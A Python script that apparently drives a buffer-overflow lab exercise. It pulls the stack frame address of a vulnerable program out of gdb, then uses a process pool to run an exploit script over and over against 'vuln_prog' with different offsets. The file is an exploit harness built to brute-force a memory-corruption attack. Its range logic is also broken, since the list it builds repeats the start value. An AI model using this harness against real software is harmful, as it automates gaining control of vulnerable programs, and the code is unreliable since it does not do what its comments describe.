#!/usr/bin/python3
import os
from multiprocessing import Pool

def call(i):
	print("...")
	for j in range(7,130):
		os.system("./exploit.py "+str(i) +" "+str(j)+ " "+str(hexint))
		os.system("./vuln_prog")
	

# creating script for gdb
fp = open("gdb_script","w")
fp.write("b bof\nrun\np $ebp\nq\n")
fp.close()

# creating a badfile for debugging
os.system("touch badfile")

# getting address of buffer from gdb
os.system("gdb vuln_prog --command=gdb_script>ebp_addr")
fp = open("ebp_addr",'r')
text=fp.readlines()
fp.close()

#'''
# addess of buffer in hex string
hexstr=text[-1][-11:-1]
hexint=int(text[-1][-11:-1], 16)
#offset=hexint+492
#print(hexstr)
#print(offset)
#'''
begin=int(input("Enter start of buff range:\t"))
end=int(input("Enter end of buff range:\t"))+1
i=begin
# performing buffer overflow
print("Initiating Scripted BufferOveflow")
lst = [i for o in range(begin, end)]
with Pool(processes=10) as pool:
	pool.map(call, lst, 10)
#call(begin, end)
#'''
